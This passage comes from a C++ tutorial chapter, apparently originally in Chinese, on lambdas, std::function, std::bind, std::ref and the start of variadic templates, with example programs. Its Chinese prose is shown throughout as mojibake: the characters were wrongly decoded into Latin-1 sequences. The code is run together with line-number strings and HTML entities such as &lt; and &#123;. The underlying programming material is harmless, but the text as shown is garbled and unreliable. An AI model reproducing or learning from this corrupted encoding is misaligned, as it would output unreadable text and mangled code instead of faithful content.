ä¼˜ç‚¹ï¼šè¯­æ³•ç®€å•ï¼Œå¯¹äºå·²å­˜åœ¨çš„æ™®é€šå‡½æ•°å¾ˆæ–¹ä¾¿ã€‚ ç¼ºç‚¹ï¼šä¸èƒ½æºå¸¦çŠ¶æ€ï¼Œé€šå¸¸æ— æ³•å†…è”ï¼Œçµæ´»æ€§å·®ã€‚ å‡½æ•°å¯¹è±¡ (Functor): ä¼˜ç‚¹ï¼šå¯ä»¥æºå¸¦çŠ¶æ€ï¼ˆé€šè¿‡æˆå‘˜å˜é‡ï¼‰ï¼Œå¯ä»¥å†…è”ï¼Œç±»å‹å®‰å…¨ã€‚ ç¼ºç‚¹ï¼šéœ€è¦å•ç‹¬å®šä¹‰ä¸€ä¸ªç±»ï¼Œä»£ç ç›¸å¯¹å†—é•¿ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç®€å•çš„æ“ä½œã€‚ Lambda å‡½æ•°: ä¼˜ç‚¹ï¼šè¯­æ³•ç®€æ´ï¼Œå¯ä»¥ç›´æ¥åœ¨è°ƒç”¨ç‚¹å®šä¹‰ï¼Œæ˜“äºé˜…è¯»ï¼›å¯ä»¥é€šè¿‡æ•è·å­å¥æ–¹ä¾¿åœ°è®¿é—®ï¼ˆæºå¸¦ï¼‰å¤–éƒ¨çŠ¶æ€ï¼›é€šå¸¸å¯ä»¥å†…è”ï¼›åŠŸèƒ½å¼ºå¤§çµæ´»ã€‚ ç¼ºç‚¹ï¼šå¯¹äºå¤æ‚æˆ–éœ€è¦åœ¨å¤šå¤„é‡ç”¨çš„é€»è¾‘ï¼Œå•ç‹¬å®šä¹‰å‡½æ•°æˆ–å‡½æ•°å¯¹è±¡å¯èƒ½æ›´æ¸…æ™°ã€‚ ç¤ºä¾‹å¯¹æ¯” (ç”¨äº std::sort çš„è‡ªå®šä¹‰æ¯”è¾ƒ): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;// 1. ä½¿ç”¨å‡½æ•°æŒ‡é’ˆbool compareDescendingPtr(int a, int b) &#123; return a &gt; b;&#125;// 2. ä½¿ç”¨å‡½æ•°å¯¹è±¡struct CompareDescendingFunctor &#123; bool operator()(int a, int b) const &#123; return a &gt; b; &#125;&#125;;int main() &#123; std::vector&lt;int&gt; v = &#123;3, 1, 4, 1, 5, 9&#125;; std::vector&lt;int&gt; v_copy1 = v; std::vector&lt;int&gt; v_copy2 = v; std::vector&lt;int&gt; v_copy3 = v; // ä½¿ç”¨å‡½æ•°æŒ‡é’ˆæ’åº std::sort(v_copy1.begin(), v_copy1.end(), compareDescendingPtr); // ä½¿ç”¨å‡½æ•°å¯¹è±¡æ’åº std::sort(v_copy2.begin(), v_copy2.end(), CompareDescendingFunctor()); // ä½¿ç”¨ Lambda å‡½æ•°æ’åº std::sort(v_copy3.begin(), v_copy3.end(), [](int a, int b) -&gt; bool &#123; return a &gt; b; &#125; // -&gt; bool å¯çœç•¥ ); std::cout &lt;&lt; &quot;Sorted (ptr): &quot;; for(int x : v_copy1) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Sorted (functor): &quot;; for(int x : v_copy2) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Sorted (lambda): &quot;; for(int x : v_copy3) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; return 0;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒLambda è¡¨è¾¾å¼æä¾›äº†æœ€ç®€æ´çš„è¯­æ³•ï¼Œå°†æ¯”è¾ƒé€»è¾‘ç›´æ¥å†™åœ¨äº† sort è°ƒç”¨å¤„ã€‚ 18.4.2 ä¸ºä½•ä½¿ç”¨ lambdaLambda è¡¨è¾¾å¼çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºå…¶ç®€æ´æ€§å’Œå±€éƒ¨æ€§ã€‚ ç®€æ´æ€§: å¯¹äºåªéœ€è¦ä¸€ä¸¤è¡Œä»£ç çš„ç®€å•æ“ä½œæˆ–è°“è¯ï¼Œå®šä¹‰ä¸€ä¸ªå®Œæ•´çš„å‡½æ•°æˆ–å‡½æ•°å¯¹è±¡ç±»æ˜¾å¾—è¿‡äºç¹çã€‚Lambda å…è®¸ç”¨éå¸¸ç´§å‡‘çš„è¯­æ³•ç›´æ¥è¡¨è¾¾è¿™äº›é€»è¾‘ã€‚ å±€éƒ¨æ€§: Lambda å¯ä»¥ç›´æ¥å®šä¹‰åœ¨ä½¿ç”¨å®ƒçš„åœ°æ–¹ï¼ˆä¾‹å¦‚ï¼Œä½œä¸ºç®—æ³•çš„å‚æ•°ï¼‰ã€‚è¿™ä½¿å¾—ä»£ç æ›´æ˜“äºé˜…è¯»å’Œç†è§£ï¼Œå› ä¸ºæ“ä½œé€»è¾‘å’Œè°ƒç”¨å®ƒçš„ä»£ç ç´§å¯†åœ°æ”¾åœ¨ä¸€èµ·ï¼Œä¸éœ€è¦è·³è½¬åˆ°å…¶ä»–åœ°æ–¹å»æŸ¥æ‰¾å‡½æ•°æˆ–ç±»çš„å®šä¹‰ã€‚ çŠ¶æ€æ•è·: Lambda çš„æ•è·æœºåˆ¶æä¾›äº†ä¸€ç§éå¸¸æ–¹ä¾¿çš„æ–¹å¼æ¥è®¿é—®å®šä¹‰ Lambda æ—¶æ‰€å¤„ä½œç”¨åŸŸçš„å±€éƒ¨å˜é‡ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å°†è¿™äº›å˜é‡åŒ…è£…åˆ°å‡½æ•°å¯¹è±¡ä¸­ã€‚ ç¤ºä¾‹ (ä½¿ç”¨æ•è·): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int threshold = 5; std::vector&lt;int&gt; results; // ä½¿ç”¨ lambda æŸ¥æ‰¾æ‰€æœ‰å¤§äº threshold çš„æ•°ï¼Œå¹¶å¤åˆ¶åˆ° results // æ•è· threshold (å€¼æ‹·è´) å’Œ results (å¼•ç”¨) std::for_each(nums.begin(), nums.end(), [threshold, &amp;results](int x) &#123; if (x &gt; threshold) &#123; results.push_back(x); // å¯ä»¥ä¿®æ”¹å¼•ç”¨æ•è·çš„ results // threshold = 10; // ç¼–è¯‘é”™è¯¯ï¼å€¼æ•è·çš„å˜é‡é»˜è®¤æ˜¯ const çš„ &#125; &#125;); std::cout &lt;&lt; &quot;Numbers greater than &quot; &lt;&lt; threshold &lt;&lt; &quot;: &quot;; for (int r : results) &#123; std::cout &lt;&lt; r &lt;&lt; &quot; &quot;; // è¾“å‡º: 6 7 8 9 10 &#125; std::cout &lt;&lt; std::endl; // æ¼”ç¤º mutable lambda (å…è®¸ä¿®æ”¹å€¼æ•è·çš„å˜é‡çš„å‰¯æœ¬) int counter = 0; auto mutable_lambda = [counter]() mutable &#123; // ä½¿ç”¨ mutable counter++; // ç°åœ¨å¯ä»¥ä¿®æ”¹ counter çš„å‰¯æœ¬äº† std::cout &lt;&lt; &quot;Lambda counter (copy): &quot; &lt;&lt; counter &lt;&lt; std::endl; &#125;; mutable_lambda(); // è¾“å‡º 1 mutable_lambda(); // è¾“å‡º 2 std::cout &lt;&lt; &quot;Original counter: &quot; &lt;&lt; counter &lt;&lt; std::endl; // è¾“å‡º 0 (åŸå§‹ counter æœªå˜) // æ¼”ç¤ºå¼•ç”¨æ•è·ä¿®æ”¹å¤–éƒ¨å˜é‡ int external_sum = 0; std::for_each(nums.begin(), nums.end(), [&amp;external_sum](int x)&#123; // å¼•ç”¨æ•è· external_sum += x; &#125;); std::cout &lt;&lt; &quot;Sum calculated via lambda: &quot; &lt;&lt; external_sum &lt;&lt; std::endl; // è¾“å‡º 55 return 0;&#125; mutable å…³é”®å­—: é»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡å€¼æ•è·çš„å˜é‡åœ¨ Lambda å‡½æ•°ä½“å†…éƒ¨æ˜¯ const çš„ï¼Œä¸èƒ½è¢«ä¿®æ”¹ã€‚å¦‚æœä½ éœ€è¦åœ¨ Lambda å†…éƒ¨ä¿®æ”¹å€¼æ•è·å˜é‡çš„å‰¯æœ¬ï¼ˆè¿™ç§ä¿®æ”¹ä¸ä¼šå½±å“å¤–éƒ¨åŸå§‹å˜é‡ï¼‰ï¼Œå¯ä»¥åœ¨å‚æ•°åˆ—è¡¨ () ä¹‹åï¼ˆæˆ–æ•è·åˆ—è¡¨ [] ä¹‹åï¼Œå¦‚æœæ²¡æœ‰å‚æ•°ï¼‰åŠ ä¸Š mutable å…³é”®å­—ã€‚ Lambda è¡¨è¾¾å¼æ˜¯ç°ä»£ C++ ä¸­ç¼–å†™ç®€æ´ã€é«˜æ•ˆä¸”æ˜“è¯»ä»£ç çš„é‡è¦å·¥å…·ï¼Œå°¤å…¶æ˜¯åœ¨ä¸ STL ç®—æ³•ç»“åˆä½¿ç”¨æ—¶ã€‚ 18.5 åŒ…è£…å™¨åœ¨ C++ ä¸­ï¼Œæœ‰å¤šç§â€œå¯è°ƒç”¨ (Callable)â€çš„å®ä½“ï¼šæ™®é€šå‡½æ•°ã€å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼ˆFunctorsï¼‰ã€Lambda è¡¨è¾¾å¼ã€ç±»çš„æˆå‘˜å‡½æ•°æŒ‡é’ˆç­‰ã€‚è™½ç„¶å®ƒä»¬éƒ½å¯ä»¥è¢«è°ƒç”¨ï¼Œä½†å®ƒä»¬çš„ç±»å‹å„ä¸ç›¸åŒã€‚è¿™åœ¨éœ€è¦å­˜å‚¨æˆ–ä¼ é€’æœªçŸ¥ç±»å‹çš„å¯è°ƒç”¨å®ä½“æ—¶ä¼šå¸¦æ¥ä¸ä¾¿ã€‚ ä¾‹å¦‚ï¼Œä½ å¯èƒ½æƒ³åˆ›å»ºä¸€ä¸ªå›è°ƒå‡½æ•°åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„å‡½æ•°å¯ä»¥æ¥è‡ªä¸åŒçš„æºï¼ˆæœ‰äº›æ˜¯æ™®é€šå‡½æ•°ï¼Œæœ‰äº›æ˜¯ Lambdaï¼Œæœ‰äº›æ˜¯å¯¹è±¡çš„æˆå‘˜å‡½æ•°ï¼‰ï¼Œä½†å®ƒä»¬éƒ½æ¥å—ç›¸åŒçš„å‚æ•°å¹¶è¿”å›ç›¸åŒçš„ç±»å‹ã€‚å¦‚ä½•ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç±»å‹æ¥å­˜å‚¨å®ƒä»¬å‘¢ï¼Ÿ C++11 åœ¨ &lt;functional&gt; å¤´æ–‡ä»¶ä¸­æä¾›äº† std::function æ¨¡æ¿ç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªé€šç”¨çš„ã€å¤šæ€çš„å‡½æ•°åŒ…è£…å™¨ (Function Wrapper)**ã€‚std::function çš„å¯¹è±¡å¯ä»¥å­˜å‚¨ã€å¤åˆ¶å’Œè°ƒç”¨**ä»»ä½•ç¬¦åˆå…¶æŒ‡å®šå‡½æ•°ç­¾åçš„å¯è°ƒç”¨å®ä½“ã€‚ 18.5.1 åŒ…è£…å™¨ functionstd::function çš„æ¨¡æ¿å‚æ•°æ˜¯å®ƒæ‰€è¦åŒ…è£…çš„å‡½æ•°çš„**ç­¾å (Signature)**ã€‚ è¯­æ³•: 123#include &lt;functional&gt;std::function&lt;ReturnType(ArgType1, ArgType2, ...)&gt; func_wrapper; ReturnType: è¢«åŒ…è£…å‡½æ•°çš„è¿”å›ç±»å‹ã€‚ ArgType1, ArgType2, ...: è¢«åŒ…è£…å‡½æ•°æ¥å—çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚ åŸºæœ¬ç”¨æ³•: ä½ å¯ä»¥å°†ä»»ä½•å…·æœ‰å…¼å®¹ç­¾åçš„å¯è°ƒç”¨å®ä½“èµ‹å€¼ç»™ std::function å¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;functional&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;// 1. æ™®é€šå‡½æ•°void print_message(const std::string&amp; msg) &#123; std::cout &lt;&lt; &quot;Function Pointer: &quot; &lt;&lt; msg &lt;&lt; std::endl;&#125;// 2. å‡½æ•°å¯¹è±¡ (Functor)struct Printer &#123; std::string prefix; Printer(std::string p) : prefix(p) &#123;&#125; void operator()(const std::string&amp; msg) const &#123; std::cout &lt;&lt; &quot;Functor (&quot; &lt;&lt; prefix &lt;&lt; &quot;): &quot; &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;;// 3. ç±»çš„æˆå‘˜å‡½æ•°struct Greeter &#123; void greet(const std::string&amp; name) &#123; std::cout &lt;&lt; &quot;Member Function: Hello, &quot; &lt;&lt; name &lt;&lt; &quot;!&quot; &lt;&lt; std::endl; &#125;&#125;;int main() &#123; // å®šä¹‰ä¸€ä¸ªå¯ä»¥åŒ…è£… void(const std::string&amp;) ç±»å‹å‡½æ•°çš„ std::function std::function&lt;void(const std::string&amp;)&gt; callback; // a) åŒ…è£…æ™®é€šå‡½æ•°æŒ‡é’ˆ callback = print_message; callback(&quot;Hello from function pointer!&quot;); // b) åŒ…è£… Lambda è¡¨è¾¾å¼ callback = [](const std::string&amp; msg) &#123; std::cout &lt;&lt; &quot;Lambda: &quot; &lt;&lt; msg &lt;&lt; std::endl; &#125;; callback(&quot;Hello from lambda!&quot;); // c) åŒ…è£…å‡½æ•°å¯¹è±¡ Printer my_printer(&quot;LOG&quot;); callback = my_printer; // Functor å¯¹è±¡å¯ä»¥ç›´æ¥èµ‹å€¼ callback(&quot;Hello from functor!&quot;); // d) åŒ…è£…ç±»çš„æˆå‘˜å‡½æ•° (éœ€è¦ç»‘å®šå¯¹è±¡) Greeter greeter_obj; // ä½¿ç”¨ std::bind (æˆ–è€… Lambda) æ¥ç»‘å®š this æŒ‡é’ˆ callback = std::bind(&amp;Greeter::greet, &amp;greeter_obj, std::placeholders::_1); // æˆ–è€…ä½¿ç”¨ Lambda æ•è·å¯¹è±¡ // callback = [&amp;greeter_obj](const std::string&amp; name)&#123; greeter_obj.greet(name); &#125;; callback(&quot;Alice&quot;); // è°ƒç”¨ greeter_obj.greet(&quot;Alice&quot;) // æ£€æŸ¥ std::function æ˜¯å¦ä¸ºç©º (æ˜¯å¦æŒæœ‰å¯è°ƒç”¨å¯¹è±¡) if (callback) &#123; std::cout &lt;&lt; &quot;Callback is holding a callable entity.&quot; &lt;&lt; std::endl; &#125; // æ¸…ç©º std::function callback = nullptr; if (!callback) &#123; std::cout &lt;&lt; &quot;Callback is now empty.&quot; &lt;&lt; std::endl; &#125; // å­˜å‚¨ä¸åŒç±»å‹çš„å›è°ƒå‡½æ•° std::vector&lt;std::function&lt;void(const std::string&amp;)&gt;&gt; callbacks; callbacks.push_back(print_message); callbacks.push_back([](const std::string&amp; s)&#123; std::cout &lt;&lt; &quot;Another Lambda: &quot; &lt;&lt; s &lt;&lt; std::endl; &#125;); callbacks.push_back(my_printer); std::cout &lt;&lt; &quot;\\n--- Calling stored callbacks ---&quot; &lt;&lt; std::endl; for (const auto&amp; cb : callbacks) &#123; cb(&quot;Test message&quot;); &#125; return 0;&#125; std::function é€šè¿‡ç±»å‹æ“¦é™¤ (Type Erasure) æŠ€æœ¯å®ç°äº†è¿™ç§é€šç”¨æ€§ã€‚å®ƒå†…éƒ¨å¯ä»¥å­˜å‚¨ä¸åŒç±»å‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå¹¶åœ¨è°ƒç”¨æ—¶é€šè¿‡æŸç§æœºåˆ¶ï¼ˆé€šå¸¸æ¶‰åŠå †åˆ†é…å’Œè™šå‡½æ•°è°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯å¯¹äºæ•è·äº†æ•°æ®çš„ Lambda æˆ–å¤§å‹å‡½æ•°å¯¹è±¡ï¼‰æ¥æ‰§è¡Œå®é™…çš„è°ƒç”¨ã€‚ 18.5.1 (ç»­) function åŠæ¨¡æ¿çš„ä½æ•ˆæ€§ (æ½œåœ¨å¼€é”€)è™½ç„¶ std::function éå¸¸çµæ´»ï¼Œä½†è¿™ç§çµæ´»æ€§æ˜¯æœ‰ä»£ä»·çš„ï¼š ç±»å‹æ“¦é™¤å¼€é”€: ä¸ºäº†èƒ½å¤Ÿå­˜å‚¨ä»»æ„ç±»å‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œstd::function é€šå¸¸éœ€è¦åœ¨å†…éƒ¨å¤„ç†ç±»å‹ä¿¡æ¯ã€‚è¿™å¯èƒ½æ¶‰åŠåˆ°ï¼š å †åˆ†é…: å¦‚æœè¢«åŒ…è£…çš„å¯è°ƒç”¨å¯¹è±¡ï¼ˆç‰¹åˆ«æ˜¯å¸¦æ•è·çš„ Lambda æˆ–å‡½æ•°å¯¹è±¡ï¼‰æ¯”è¾ƒå¤§ï¼Œæˆ–è€…ä¸èƒ½é€šè¿‡â€œå°å¯¹è±¡ä¼˜åŒ– (Small Object Optimization, SOO)â€ç›´æ¥å­˜å‚¨åœ¨ std::function å¯¹è±¡å†…éƒ¨ï¼Œå°±å¯èƒ½éœ€è¦åœ¨å †ä¸Šåˆ†é…å†…å­˜æ¥å­˜å‚¨å®ƒã€‚å †åˆ†é…å’Œé‡Šæ”¾æ˜¯æœ‰å¼€é”€çš„ã€‚ é—´æ¥è°ƒç”¨: è°ƒç”¨å­˜å‚¨åœ¨ std::function ä¸­çš„å‡½æ•°é€šå¸¸éœ€è¦é€šè¿‡æŒ‡é’ˆæˆ–è™šå‡½æ•°è¿›è¡Œé—´æ¥è°ƒç”¨ï¼Œè¿™æ¯”ç›´æ¥å‡½æ•°è°ƒç”¨æˆ–æ¨¡æ¿å®ä¾‹åŒ–äº§ç”Ÿçš„å†…è”è°ƒç”¨è¦æ…¢ã€‚ ç›¸æ¯”æ¨¡æ¿çš„ä½æ•ˆæ€§: å¦‚æœåœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“å…·ä½“çš„å¯è°ƒç”¨ç±»å‹ï¼Œä½¿ç”¨æ¨¡æ¿é€šå¸¸ä¼šæ›´é«˜æ•ˆã€‚æ¨¡æ¿å…è®¸ç¼–è¯‘å™¨ä¸ºæ¯ç§å…·ä½“çš„ç±»å‹ç”Ÿæˆä¸“é—¨çš„ä»£ç ï¼Œå¹¶ä¸”æ›´å®¹æ˜“è¿›è¡Œå†…è”ä¼˜åŒ–ï¼Œé¿å…äº† std::function çš„ç±»å‹æ“¦é™¤å’Œé—´æ¥è°ƒç”¨å¼€é”€ã€‚ 1234567891011121314151617// ä½¿ç”¨æ¨¡æ¿ï¼Œæ›´é«˜æ•ˆtemplate &lt;typename Callable&gt;void process_with_template(Callable func, const std::string&amp; data) &#123; func(data); // ç›´æ¥è°ƒç”¨ï¼Œå¯èƒ½å†…è”&#125;// ä½¿ç”¨ std::functionï¼Œæ›´çµæ´»ï¼Œä½†å¯èƒ½æœ‰å¼€é”€void process_with_function(std::function&lt;void(const std::string&amp;)&gt; func, const std::string&amp; data) &#123; func(data); // é—´æ¥è°ƒç”¨&#125;int main() &#123; auto my_lambda = [](const std::string&amp; s)&#123; /*...*/ &#125;; process_with_template(my_lambda, &quot;data&quot;); // é«˜æ•ˆ process_with_function(my_lambda, &quot;data&quot;); // çµæ´»ï¼Œä½†å¯èƒ½ç¨æ…¢ return 0;&#125; ä½•æ—¶ä½¿ç”¨ std::functionï¼Ÿ å½“ä½ éœ€è¦åœ¨è¿è¡Œæ—¶ç¡®å®šè¦è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œæˆ–è€…éœ€è¦å­˜å‚¨ä¸åŒç±»å‹çš„å¯è°ƒç”¨å¯¹è±¡åœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­æ—¶ï¼ˆå¦‚å›è°ƒç³»ç»Ÿã€äº‹ä»¶å¤„ç†ï¼‰ã€‚ å½“ä½ éœ€è¦å®šä¹‰ä¸€ä¸ªæ¥å—ä»»ä½•ç¬¦åˆç‰¹å®šç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„æ¥å£æ—¶ã€‚ ä½•æ—¶é¿å…ä½¿ç”¨ std::function (å¦‚æœæ€§èƒ½æ˜¯å…³é”®)ï¼Ÿ å½“ä½ åœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“å…·ä½“çš„å¯è°ƒç”¨ç±»å‹æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨æ¨¡æ¿æˆ–ç›´æ¥è°ƒç”¨ã€‚ åœ¨æ€§èƒ½æå…¶æ•æ„Ÿçš„ä»£ç è·¯å¾„ä¸­ï¼ˆå¦‚ç´§å¯†å¾ªç¯å†…éƒ¨ï¼‰ï¼Œéœ€è¦ä»”ç»†è¯„ä¼° std::function å¸¦æ¥çš„å¼€é”€ã€‚ 18.5.2 ä¿®å¤é—®é¢˜ / 18.5.3 å…¶ä»–æ–¹å¼è¿™é‡Œçš„â€œä¿®å¤é—®é¢˜â€ä¸»è¦æ˜¯æŒ‡ç†è§£ std::function çš„å¼€é”€å¹¶æ ¹æ®åœºæ™¯é€‰æ‹©åˆé€‚çš„æŠ€æœ¯ã€‚â€œå…¶ä»–æ–¹å¼â€åˆ™åŒ…æ‹¬ï¼š ä½¿ç”¨æ¨¡æ¿: å¦‚ä¸Šæ‰€è¿°ï¼Œå½“ç±»å‹åœ¨ç¼–è¯‘æ—¶å·²çŸ¥æ—¶ï¼Œæ¨¡æ¿æ˜¯æœ€é«˜æ•ˆçš„é€‰æ‹©ã€‚ ä½¿ç”¨å‡½æ•°æŒ‡é’ˆ: å¯¹äºç®€å•çš„ã€æ— çŠ¶æ€çš„å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨å‡½æ•°æŒ‡é’ˆç±»å‹ ReturnType(*)(ArgTypes...) ä»ç„¶æ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å¼€é”€å¾ˆå°ã€‚ ä½¿ç”¨ Lambda: Lambda æœ¬èº«æ˜¯é«˜æ•ˆçš„ï¼ˆå®ƒä»¬æ˜¯åŒ¿åçš„å‡½æ•°å¯¹è±¡ï¼‰ã€‚åªæœ‰å½“å®ƒä»¬è¢«å­˜å‚¨åœ¨ std::function ä¸­æ—¶ï¼Œæ‰å¯èƒ½å¼•å…¥ std::function çš„å¼€é”€ã€‚å¦‚æœå¯ä»¥å°† Lambda ç›´æ¥ä¼ é€’ç»™æ¨¡æ¿åŒ–çš„å‡½æ•°ï¼ˆå¦‚ STL ç®—æ³•ï¼‰ï¼Œé€šå¸¸ä¸ä¼šæœ‰é¢å¤–å¼€é”€ã€‚ std::bind: (åœ¨ &lt;functional&gt; ä¸­) std::bind å¯ä»¥ç”¨æ¥ç»‘å®šå‡½æ•°çš„å‚æ•°ï¼ˆåŒ…æ‹¬æˆå‘˜å‡½æ•°çš„ this æŒ‡é’ˆï¼‰æˆ–é‡æ–°æ’åˆ—å‚æ•°é¡ºåºï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å¯è°ƒç”¨å¯¹è±¡ (å‡½æ•°å¯¹è±¡)ã€‚è™½ç„¶ std::bind ä¹Ÿèƒ½è¢« std::function å­˜å‚¨ï¼Œä½†ç°ä»£ C++ ä¸­ï¼ŒLambda é€šå¸¸æä¾›äº†æ›´ç®€æ´ã€æ›´æ˜“è¯»çš„æ–¹å¼æ¥å®Œæˆç±»ä¼¼çš„ä»»åŠ¡ã€‚ 123456789101112131415161718#include &lt;functional&gt;#include &lt;iostream&gt;void func(int a, int b, int c) &#123; std::cout &lt;&lt; &quot;a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl;&#125;int main() &#123; // ç»‘å®šç¬¬ä¸€ä¸ªå‚æ•°ä¸º 100ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”±è°ƒç”¨è€…æä¾› (_1)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º 300 auto bound_func = std::bind(func, 100, std::placeholders::_1, 300); bound_func(200); // è°ƒç”¨ func(100, 200, 300) // ä½¿ç”¨ Lambda å®ç°ç›¸åŒæ•ˆæœ auto lambda_func = [](int b)&#123; func(100, b, 300); &#125;; lambda_func(200); // è°ƒç”¨ func(100, 200, 300) return 0;&#125; std::ref å’Œ std::cref: (åœ¨ &lt;functional&gt; ä¸­) å½“ä½ æƒ³é€šè¿‡å€¼ä¼ é€’çš„åŒ…è£…å™¨ï¼ˆå¦‚ std::bind, std::thread æ„é€ å‡½æ•°, ç”šè‡³æŸäº›æƒ…å†µä¸‹çš„ std::functionï¼‰ä¼ é€’å‚æ•°çš„å¼•ç”¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨ std::ref (ç”¨äºé const å¼•ç”¨) æˆ– std::cref (ç”¨äº const å¼•ç”¨) æ¥åŒ…è£…å‚æ•°ã€‚å®ƒä»¬åˆ›å»ºäº†ä¸€ä¸ªè½»é‡çº§çš„å¼•ç”¨åŒ…è£…å™¨å¯¹è±¡ã€‚ 12345678910111213141516171819202122232425262728293031323334#include &lt;functional&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;thread&gt;void modify_vector(std::vector&lt;int&gt;&amp; vec) &#123; // æ¥å—å¼•ç”¨ if (!vec.empty()) &#123; vec[0] = 100; &#125;&#125;int main() &#123; std::vector&lt;int&gt; my_vec = &#123;1, 2, 3&#125;; // std::bind é»˜è®¤æŒ‰å€¼å¤åˆ¶å‚æ•° // auto bound_copy = std::bind(modify_vector, my_vec); // é”™è¯¯æˆ–æ— æ•ˆï¼Œbind å¤åˆ¶äº† vector // bound_copy(); // ä¿®æ”¹çš„æ˜¯å‰¯æœ¬ // ä½¿ç”¨ std::ref ä¼ é€’å¼•ç”¨ auto bound_ref = std::bind(modify_vector, std::ref(my_vec)); bound_ref(); // æ­£ç¡®è°ƒç”¨ modify_vector(my_vec) std::cout &lt;&lt; &quot;Vector after bind+ref: &quot; &lt;&lt; my_vec[0] &lt;&lt; std::endl; // è¾“å‡º 100 // std::thread æ„é€ å‡½æ•°ä¹Ÿå¤åˆ¶å‚æ•°ï¼Œéœ€è¦ std::ref ä¼ é€’å¼•ç”¨ my_vec[0] = 1; // Reset // std::thread t1(modify_vector, my_vec); // çº¿ç¨‹æ“ä½œçš„æ˜¯ my_vec çš„å‰¯æœ¬ std::thread t2(modify_vector, std::ref(my_vec)); // çº¿ç¨‹æ“ä½œçš„æ˜¯ my_vec çš„å¼•ç”¨ // t1.join(); t2.join(); std::cout &lt;&lt; &quot;Vector after thread+ref: &quot; &lt;&lt; my_vec[0] &lt;&lt; std::endl; // è¾“å‡º 100 return 0;&#125; æ€»ä¹‹ï¼Œstd::function æ˜¯ä¸€ä¸ªå¼ºå¤§çš„é€šç”¨å‡½æ•°åŒ…è£…å™¨ï¼Œæä¾›äº†æå¤§çš„çµæ´»æ€§ï¼Œä½†åœ¨æ€§èƒ½æ•æ„Ÿçš„åœºæ™¯ä¸‹éœ€è¦æ³¨æ„å…¶æ½œåœ¨å¼€é”€ï¼Œå¹¶è€ƒè™‘ä½¿ç”¨æ¨¡æ¿ã€å‡½æ•°æŒ‡é’ˆæˆ–ç›´æ¥ä¼ é€’ Lambda ç­‰æ›¿ä»£æ–¹æ¡ˆã€‚ 18.6 å¯å˜å‚æ•°æ¨¡æ¿åœ¨ C++11 ä¹‹å‰ï¼Œæ¨¡æ¿ï¼ˆå‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿ï¼‰é€šå¸¸åªèƒ½æ¥å—å›ºå®šæ•°é‡çš„æ¨¡æ¿å‚æ•°ã€‚å¦‚æœä½ æƒ³ç¼–å†™ä¸€ä¸ªå¯ä»¥æ¥å—ä»»æ„æ•°é‡å‚æ•°çš„å‡½æ•°ï¼ˆç±»ä¼¼äº C è¯­è¨€ä¸­çš„ printfï¼‰ï¼Œé€šå¸¸éœ€è¦ä¾èµ– C é£æ ¼çš„å¯å˜å‚æ•°æœºåˆ¶ (&lt;cstdarg&gt;)ï¼Œè¿™ç§æœºåˆ¶ä¸æ˜¯ç±»å‹å®‰å…¨çš„ã€‚ C++11 å¼•å…¥äº†å¯å˜å‚æ•°æ¨¡æ¿ (Variadic Templates)**ï¼Œå…è®¸æ¨¡æ¿ï¼ˆåŒ…æ‹¬å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿ï¼‰æ¥å—ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹**çš„æ¨¡æ¿å‚æ•°ï¼Œå¹¶åœ¨ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹å®‰å…¨çš„å¤„ç†ã€‚ 18.6.1 æ¨¡æ¿å’Œå‡½æ•°å‚æ•°åŒ…å¯å˜å‚æ•°æ¨¡æ¿çš„æ ¸å¿ƒæ˜¯**å‚æ•°åŒ… (Parameter Pack)**ã€‚å‚æ•°åŒ…æœ‰ä¸¤ç§ï¼š æ¨¡æ¿å‚æ•°åŒ… (Template Parameter Pack): ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªæ¨¡æ¿å‚æ•°ï¼ˆç±»å‹å‚æ•°ã€éç±»å‹å‚æ•°æˆ–æ¨¡æ¿å‚æ•°ï¼‰ã€‚ è¯­æ³•ï¼štypename... Args æˆ– class... 